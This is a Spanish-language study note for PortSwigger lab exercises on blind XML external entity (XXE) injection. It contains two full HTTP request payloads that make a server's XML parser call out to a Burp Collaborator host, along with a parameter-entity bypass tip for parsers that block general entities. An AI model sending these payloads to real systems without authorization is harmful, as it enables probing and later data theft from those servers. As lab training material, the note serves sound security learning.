---
aliases:
  - XXE ciego - callback OOB
  - blind xxe collaborator
  - xxe parameter entities oob
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — XXE ciego: callback OOB con Collaborator

> Labs: [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction) · [via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

**Qué demuestra:** la respuesta **no refleja** nada (ciego). Para **confirmar** que hay XXE, hacés que el parser pegue un **callback OOB** a tu Burp Collaborator. Dos escalones según qué filtre el parser.

## Vector completo

**Escalón 1 — entidad general externa:**
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Escalón 2 — si el escalón 1 no dispara** (el parser bloquea entidades **generales** externas), pasás a **entidad de parámetro** (`%`):
```http
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
En Burp → pestaña **Collaborator** → **Poll now**. Deberías ver interacciones **DNS y HTTP** iniciadas por el server. Eso confirma el XXE ciego (todavía sin extraer datos → ver [[vulnerabilities/006-xxe/examples/xxe-ciego-exfiltrar-con-dtd-externo|exfiltración]]).

## Detalles que se pasan por alto
- **`%xxe;` va DENTRO del DTD** (los corchetes del DOCTYPE), no en el cuerpo. Con entidad de parámetro **no** hace falta referenciarla en `productId` (se dispara al declararse).
- La entidad general (`&xxe;`) **sí** hay que referenciarla en el cuerpo (`&xxe;` en `productId`).
- Regla: **si `&` no dispara → probá `%`.** Es el bypass más común de validadores.
- El payload de Collaborator (`COLLAB.oastify.com`) lo copiás con "Copy to clipboard" en la pestaña Collaborator.
